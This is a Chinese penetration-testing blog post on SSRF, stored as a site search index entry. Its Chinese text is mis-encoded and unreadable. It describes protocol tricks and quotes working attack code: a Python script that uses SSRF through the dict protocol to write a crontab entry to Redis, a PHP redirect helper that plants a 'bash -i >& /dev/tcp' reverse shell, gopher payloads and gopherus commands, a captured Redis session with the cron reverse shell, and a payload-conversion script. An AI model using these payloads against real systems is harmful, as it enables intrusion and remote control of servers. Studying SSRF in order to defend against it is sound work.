<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SSRFçš„é‚£äº›é—®é¢˜</title>
    <url>//posts/SSRF%E7%9A%84%E9%82%A3%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>SSRFæ˜¯éå¸¸å®¹æ˜“å¿½ç•¥çš„ä¸€ä¸ªæ¼æ´ï¼Œæˆ‘ç”šè‡³åœ¨æ¸—é€æµ‹è¯•çš„é¡¹ç›®ä¸­ç”šè‡³ä¸ä¼šå»æ·±ç©¶è¿™æ–¹é¢çš„æ¼æ´ï¼Œå› ä¸ºå®ƒé€šå¸¸å±å®³è¾ƒå°ï¼Œå¹¶ä¸”æéš¾åˆ©ç”¨ã€‚ä½†æ˜¯ä¸Šæ¬¡æˆ‘åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å‘ç°äº†ä¸€ä¸ªSSRFï¼Œå¹¶ä¸”åŒæœåŠ¡å™¨è¿˜æœ‰å¦ä¸€ä¸ªå¯¹å†…å¼€æ”¾çš„ç½‘ç«™ï¼Œè¿™æ ·è¿™ä¸ªSSRFå°±ä¸ºæ”»å‡»è€…å»ºç«‹äº†ä¸€ä¸ªä»å¯¹å¤–å¼€æ”¾åˆ°ç½‘ç«™æ¸—é€åˆ°å¯¹å†…å¼€æ”¾çš„ç½‘ç«™ã€‚æœ€ååˆ©ç”¨SSRFæ¢æµ‹åˆ°äº†å¯¹å†…å¼€æ”¾çš„é‚£ä¸ªç½‘ç«™æœ‰sqlæ³¨å…¥ï¼Œè™½ç„¶æ²¡æœ‰getshellï¼Œä½†æ˜¯è¿˜æ˜¯å¼•èµ·äº†é‡è§†ï¼ŒSSRFåœ¨å¾ˆå¤šæ—¶å€™è¿˜æ˜¯æœ‰ç”¨æ­¦ä¹‹åœ°çš„ã€‚</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å¾ˆæ™¦æ¶©ï¼ï¼ï¼ä¸¾ä¸ªä¾‹å­ï¼šæœåŠ¡ç«¯æœ‰ä¸€ä¸ªåœ¨çº¿åŠ è½½å›¾ç‰‡çš„åŠŸèƒ½ï¼Œä½ ä¼ å…¥ä¸€ä¸ªå›¾ç‰‡URLï¼Œç½‘ç«™å°±ä¼šåŠ è½½å‡ºæ¥å¯¹åº”å›¾ç‰‡ï¼Œæ‰€ä»¥å›¾ç‰‡çš„URLæ˜¯ç½‘ç«™æœåŠ¡å™¨å»è®¿é—®çš„ï¼Œå¦‚æœæˆ‘ä»¬åˆ©ç”¨è¿™ç‚¹ä¼ å…¥ä¸€äº›åªæœ‰æœåŠ¡ç«¯æ‰èƒ½è¿›è¡Œè®¿é—®çš„URLï¼Œæ¯”å¦‚ä¸å¯¹å¤–å¼€æ”¾çš„åå°åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚</p>
<span id="more"></span>

<h3 id="å¸¸ç®€å­˜åœ¨SSRFæ¼æ´çš„å‡½æ•°"><a href="#å¸¸ç®€å­˜åœ¨SSRFæ¼æ´çš„å‡½æ•°" class="headerlink" title="å¸¸ç®€å­˜åœ¨SSRFæ¼æ´çš„å‡½æ•°"></a>å¸¸ç®€å­˜åœ¨SSRFæ¼æ´çš„å‡½æ•°</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>1.file_get_contents()<br>2.fsockopen()<br>3.curl_exec()   é»˜è®¤ä¸æ”¯æŒ302è·³è½¬çš„</p>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>1.HttpClient<br>2.Request (å¯¹HttpClientå°è£…åçš„ç±»)<br>3.HttpURLConnection<br>4.URLConnection<br>5.URL<br>6.okhttp<br>ä»¥ä¸Šçš„å‡ ä¸ªå‘é€ç½‘ç»œè¯·æ±‚çš„ç±»éƒ½æœ‰å¯èƒ½å¯¼è‡´SSRFï¼Œä½†æ˜¯javaçš„å„ä¸ªç±»å¯¹åè®®çš„æ”¯æŒå„æœ‰ä¸åŒï¼Œæ‰€ä»¥åˆ©ç”¨è¿‡ç¨‹é¦–å…ˆå¾—ç¡®å®šæ”¯æŒå“ªäº›åè®®ã€‚</p>
<h3 id="SSRFæ”¯æŒçš„åè®®"><a href="#SSRFæ”¯æŒçš„åè®®" class="headerlink" title="SSRFæ”¯æŒçš„åè®®"></a>SSRFæ”¯æŒçš„åè®®</h3><p>è¿™é‡Œåè®®æè¿°çš„ç»†ä¸€ç‚¹ï¼Œä¹Ÿå‚è€ƒäº†å„ä¸ªæ–‡ç« çš„trickã€‚å› ä¸ºåè®®çš„æŠ€å·§éƒ½æ˜¯é€šç”¨çš„ï¼Œxxeã€æ–‡ä»¶è¯»å–ã€æ–‡ä»¶åŒ…å«ç­‰éƒ½å¯èƒ½ç”¨çš„ä¸Šã€‚</p>
<table>
<thead>
<tr>
<th>è¯­è¨€æ”¯æŒåè®®è¡¨</th>
<th>php</th>
<th>Java</th>
<th>curl</th>
<th>Perl</th>
<th>ASP.NET</th>
</tr>
</thead>
<tbody><tr>
<td>http&#x2F;https</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>gopher</td>
<td>-with-curlwrappers</td>
<td>Before JDK1.7</td>
<td>before 7.49.0 ä¸æ”¯æŒ\x00</td>
<td>&amp;radic;</td>
<td>Before version 3</td>
</tr>
<tr>
<td>tftp</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>before 7.49.0 ä¸æ”¯æŒ\x00</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>dict</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>file</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>ftp</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>imap</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>pop3</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>rtsp</td>
<td>-with-curlwrappers</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>smb</td>
<td>-with-curlwrappers</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>smtp</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>telnet</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>ssh2</td>
<td>å—é™äºallow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>å—é™äºNET:SSH2</td>
<td>X</td>
</tr>
<tr>
<td>ogg</td>
<td>å—é™äºallow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>expect</td>
<td>å—é™äºallow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>ldap</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>php</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>zlib&#x2F;bzip&#x2F;zip</td>
<td>å—é™äºallow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
</tbody></table>
<p><strong>SFTP</strong></p>
<p>åœ¨è¿™é‡Œï¼ŒSftpä»£è¡¨SSHæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸SSHæ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://test.net/ssrf.php?url=sftp://evil.com:11111/</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line">$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)SSH-2.0-libssh2_1.4.2</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸è¦å¤©çœŸçš„ä»¥ä¸ºå®ƒæ˜¯sftpå°±èƒ½ä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ä¸Šã€‚</span></span><br></pre></td></tr></table></figure>

<p><strong>DICT</strong></p>
<p>DICTä¸»è¦ç”¨æ¥æ¢æµ‹ç«¯å£å’ŒæœåŠ¡æ˜¯å¦å¼€å¯ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥è¿›è¡Œredisçš„åˆ©ç”¨ï¼Œä¹Œäº‘çš„çŒªçŒªä¾ å°±æœ‰ä¸€ä¸ªç»å…¸çš„SSRF+dictåè®®+redisæœªæˆæƒ getshellï¼Œæ­¤å¤–å°ç±³ä¹Ÿå‡ºç°è¿‡ç›¸åŒçš„é—®é¢˜ï¼Œæ‰€ä»¥DICTåè®®åœ¨SSRFç”¨å¤„è¿˜æ˜¯è›®å¤§çš„ã€‚</p>
<p>åˆ¤æ–­DICTæ˜¯å¦å¯ç”¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">evil.com:$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>

<p>æ¢æµ‹ç«¯å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç›´æ¥dict://ip:port/</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=dict://127.0.0.1:9999</span><br><span class="line"><span class="comment">#ä¸€èˆ¬æ¥è¯´ ç«¯å£å­˜åœ¨ ç«‹é©¬å“åº”(å¤šä¸ºå†…ç½®çš„æŠ¥é”™é¡µé¢ï¼Œæˆ–è€…å¯¹åº”æœåŠ¡ä¿¡æ¯) ä¸å­˜åœ¨çš„ç«¯å£ä¼šå»¶è¿Ÿå“åº”(å¤šä¸ºæ— æ³•è¿æ¥) å¯ä»¥é€šè¿‡å·²çŸ¥å¼€æ”¾ç«¯å£çš„å“åº”ç»“æœä¿©è¿›è¡ŒåŒºåˆ†ã€‚</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨dictåè®®å‘Redisæ•°æ®åº“å†™shell<br>å…³äºdictåè®®ï¼š</p>
<blockquote>
<p><a href="https://links.jianshu.com/go?to=dict://serverip:port/">dict:&#x2F;&#x2F;serverip:port&#x2F;</a>å‘½ä»¤:å‚æ•°<br>å‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ å‘½ä»¤:å‚æ•°ï¼Œå¹¶åœ¨æœ«å°¾è‡ªåŠ¨è¡¥ä¸Š\r\n(CRLF)ï¼Œä¸ºæ¼æ´åˆ©ç”¨å¢æ·»äº†ä¾¿åˆ©</p>
</blockquote>
<p>DICTå¯¹redisçš„åˆ©ç”¨(å¼•ç”¨äº†è…¾è®¯çš„SSRFæ¼æ´çš„ä»£ç )ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># email: ringzero@0x557.org</span></span><br><span class="line">import requests</span><br><span class="line">host = <span class="string">&#x27;42.62.67.198&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">bhost = <span class="string">&#x27;fuzz.wuyun.org&#x27;</span></span><br><span class="line">bport = <span class="string">&#x27;8080&#x27;</span></span><br><span class="line">vul_httpurl = <span class="string">&#x27;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=&#x27;</span></span><br><span class="line">_location = <span class="string">&#x27;http://fuzz.wuyun.org/302.php&#x27;</span></span><br><span class="line">shell_location = <span class="string">&#x27;http://fuzz.wuyun.org/shell.php&#x27;</span></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port,</span><br><span class="line">    bhost = bhost,</span><br><span class="line">    bport = bport)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(shell_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#3 config set dir /var/spool/cron/</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron/&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#4 config set dbfilename root</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#5 save to file</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shell.php è¾…åŠ©è„šæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$bhost</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bhost&#x27;</span>];</span><br><span class="line"><span class="variable">$bport</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bport&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/<span class="subst">&#123;$bhost&#125;</span>/<span class="subst">&#123;$bport&#125;</span>\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>gopher</strong></p>
<p>è¿™ä¸ªåè®®è¦å†™çš„é•¿ä¸€ç‚¹,ä»–æ˜¯ä¸€ä¸ªTCP&#x2F;IPå±‚åè®®ï¼Œæ‰€ä»¥å¯ä»¥å¹²å¾ˆå¤šäº‹æƒ…ï¼Œå®ƒå¯ä»¥GETè¯·æ±‚ä¹Ÿå¯ä»¥POSTè¯·æ±‚,è¿˜å¯ä»¥å‘é‚®ä»¶ã€æ”»å‡»mysqlã€redisã€fastcgiç­‰ç­‰ï¼Œæ€»ä¹‹å°±æ˜¯æŒºå¼ºå¤§çš„ã€‚ä½†æ˜¯è®°ä½gopheråè®®çš„é»˜è®¤ç«¯å£æ˜¯70,æ‰€ä»¥å¦‚æœä¼ªé€ httpåè®®è®°å¾—å†™ç«¯å£ã€‚å¦å¤–æ¨èä¸€ä¸ªç”Ÿæˆgopheråè®®payloadçš„å·¥å…·ï¼š<a href="https://github.com/tarunkant/Gopherus">gopherus</a>ï¼ˆæ³¨æ„payloadéœ€è¦URLç¼–ç ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯äºŒæ¬¡ç¼–ç ï¼‰</p>
<p>gopherå¯ä»¥è¿›è¡Œgetå’Œpostå’Œå…¶ä»–ä¸€äº›åè®®çš„å¤„ç†,å°¤å…¶æ˜¯POST,æ‰€ä»¥ç»å¸¸ç”¨æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨,æ¯”å¦‚å†…ç½‘çš„å…¶ä»–ç½‘ç«™çš„æ”»å‡»,ä¸Šä¼ æ–‡ä»¶,POSTä¸€äº›å‚æ•°ç­‰ç­‰ã€‚gopheråè®®çš„æ ¼å¼:<code>gopher:/ip:port/_ + payload</code><br>ä¸‹é¢ä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¦‚æœä½ æƒ³è¦è®¿é—®ä¸€ä¸ªå†…ç½‘æ‰å¯ä»¥è®¿é—®çš„åœ°å€</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=gopher://192.168.37.18:80/%20GET%20/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦‚æœä½ æƒ³è¦POSTæ•°æ®åˆ°å¯¹åº”å†…ç½‘ç½‘å€ï¼ˆå›è½¦æ¢è¡Œç¬¦å·è¦è¿›è¡Œ2æ¬¡urlç¼–ç %250d%250aï¼‰</span></span><br><span class="line">http://192.168.34.29/ssrf/index.php?url=gopher://192.168.34.29:80/_POST%20%2fssrf%2fflag.php%20HTTP%2f1.1%250d%250aHost%3A%20192.168.34.29%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%206%250d%250a%250d%250aflag%3D1ï¼ˆåœ¨nginx 1.11ä¸‹POSTæ•°æ®æœªæˆåŠŸï¼Œæ—¥å¿—æŸ¥è¯¢POSTä¸ºä¸¤ä¸ª - ç°åœ¨è¿˜æ²¡æ‰¾åˆ°åŸå› ï¼ŒçŸ¥é“åŸå› çš„åŒå­¦å¯ä»¥ç•™è¨€ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…¶ä»–çš„ä¸å¸¸è§payload ä½ å¯ä»¥ç”¨ä¸Šé¢æˆ‘ç»™å‡ºçš„å·¥å…·è¿›è¡Œç”Ÿæˆï¼Œæ¯”å¦‚ï¼š</span></span><br><span class="line">gopherus --exploit zabbix</span><br><span class="line">gopherus --exploit redis</span><br><span class="line">gopherus --exploit mysql</span><br><span class="line">...</span><br><span class="line">gopheræ˜¯SSRFä¸­æœ€å¼ºå¤§çš„ä¸€ä¸ªåè®®ï¼Œè¯·é¦–å…ˆç¡®å®šè¯¥åè®®æ˜¯å¦å¯ç”¨ã€‚</span><br></pre></td></tr></table></figure>
<p>gopherä¸ºå•¥ç‰¹åˆ«å±é™©å‘¢ï¼Ÿå› ä¸ºä»–å¯ä»¥è¢«ç§°ä¸ºä¸‡èƒ½åè®®ï¼Œå¯ä»¥å‘èµ·å…¶ä»–å„ç§åè®®çš„è¯·æ±‚ï¼Œæ”»å‡»redisã€mysqlã€fastcgiç­‰ã€‚<br>æ¯”å¦‚æ”»å‡»redisï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŠ“å–redisåå¼¹é‚£shellçš„åŒ…å¦‚ä¸‹</span></span><br><span class="line">[root@Centos ~]<span class="comment"># socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span></span><br><span class="line">&gt; 2018/09/25 10:35:24.944863  length=18 from=0 to=17</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$8</span>\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.948320  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.955995  length=88 from=0 to=87</span><br><span class="line">*3\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$1</span>\r</span><br><span class="line">1\r</span><br><span class="line"><span class="variable">$61</span>\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.956209  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.959588  length=57 from=0 to=56</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">dir</span>\r</span><br><span class="line"><span class="variable">$16</span>\r</span><br><span class="line">/var/spool/cron/\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.960138  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.967473  length=52 from=0 to=51</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$10</span>\r</span><br><span class="line">dbfilename\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.967772  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.974068  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.976103  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.983836  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.984123  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>
<p>å¼•ç”¨ä¸‹JoyChouå¸ˆå‚…çš„è½¬æ¢è„šæœ¬:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[-<span class="number">3</span>:-<span class="number">1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯&gt;æˆ–è€…&lt; é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚</p>
</li>
<li><p>å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯+OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p>å°†\rå­—ç¬¦ä¸²æ›¿æ¢æˆ%0d%0a</p>
</li>
